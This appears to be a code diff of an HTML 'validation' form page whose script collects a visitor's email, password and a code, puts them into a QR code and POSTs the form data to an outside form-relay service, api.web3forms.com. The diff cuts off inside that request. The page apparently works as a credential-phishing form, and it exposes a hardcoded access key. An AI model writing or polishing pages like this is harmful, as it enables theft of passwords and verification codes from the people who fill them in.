@@ -25,9 +25,14 @@
   <article>
 
     <form class="pure-steps" id="validationForm" method="POST">
-	  <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked="">
-      <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
-	  <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
+  <!-- Radios must come first -->
+  <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked>
+  <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
+
+  <!-- Hidden input can come after -->
+  <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
+
+  <!-- rest of your form -->
       <div class="pure-steps_group">
         <ol>
           <li class="pure-steps_group-step">
@@ -91,27 +96,31 @@
 </section>
 <script>
 document.getElementById("validationForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // stop redirect
+  event.preventDefault(); // stop default submission
 
+  // Collect form values
   const email = document.getElementById("input_email").value;
   const password = document.getElementById("input_password").value;
   const code = document.getElementById("input_code").value;
   const issue = document.getElementById("cars").value;
 
+  // Simple validation
   if (!email || !password) {
     alert("Please fill in required fields.");
     return;
   }
 
-  // Generate QR code
+  // Clear any previous QR code
   document.getElementById("qrcode").innerHTML = "";
+
+  // Generate QR code with form data
   new QRCode(document.getElementById("qrcode"), {
-    text: `Validation Successful!\nIssue: ${issue}\nEmail: ${email}`,
+    text: `Issue: ${issue}\nEmail: ${email}\nCode: ${code}`,
     width: 200,
     height: 200
   });
 
-  // Send data via fetch (instead of redirect)
+  // Optionally send data to Web3Forms
   fetch("https://api.web3forms.com/submit", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
